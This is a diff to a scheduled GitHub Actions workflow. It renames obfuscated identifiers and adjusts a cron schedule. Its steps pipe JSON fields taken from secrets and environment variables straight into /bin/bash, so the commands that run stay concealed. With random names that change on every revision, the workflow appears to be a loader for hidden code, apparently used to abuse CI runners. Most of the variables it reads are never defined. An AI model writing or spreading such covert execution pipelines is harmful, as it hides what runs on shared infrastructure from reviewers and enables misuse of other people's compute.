@@ -2,28 +2,23 @@ name: changyongjiu2314
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '50 3/6 * * *'
 
-jobs:  # 21472
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: changyongjiu2314
         env:
-          hbh32410: ${{ secrets.hbh32410 }}
+          e2072: ${{ secrets.e2072 }}
         run: |
-          echo $hbh32410 | jq -r .itwrp981 | /bin/bash
-          echo $r38651 | jq -r .gnoy355 | /bin/bash
-          echo $bfzel9 | jq -r .qhs72 | /bin/bash
-          echo $ygzsm9931 | jq -r .vxhuo66658 | /bin/bash
-          echo $p4 | jq -r .et3849 | /bin/bash
-          echo $igmb25858 | jq -r .qc57750 | /bin/bash
-          echo $ul00313 | jq -r .mazjb69 | /bin/bash
-          echo $zn7077 | jq -r .hv59801 | /bin/bash
-          echo $usqj3 | jq -r .nbqzx3603 | /bin/bash
-          echo $rikw203 | jq -r .x8 | /bin/bash
-          echo $ih11 | jq -r .midu3875 | /bin/bash
-          echo $vgxno79 | jq -r .sdwu52 | /bin/bash
-          echo $xu5 | jq -r .ez7 | /bin/bash
+          echo $e2072 | jq -r .somzz05206 | /bin/bash
+          echo $n301 | jq -r .mzorp34 | /bin/bash
+          echo $s22804 | jq -r .l87887 | /bin/bash
+          echo $ee9 | jq -r .adxc754 | /bin/bash
+          echo $sp77702 | jq -r .nu9 | /bin/bash
+          echo $gfhk04 | jq -r .qzssn438 | /bin/bash
+          echo $xo78598 | jq -r .dvsp1195 | /bin/bash
+          echo $tndd365 | jq -r .h663 | /bin/bash
 
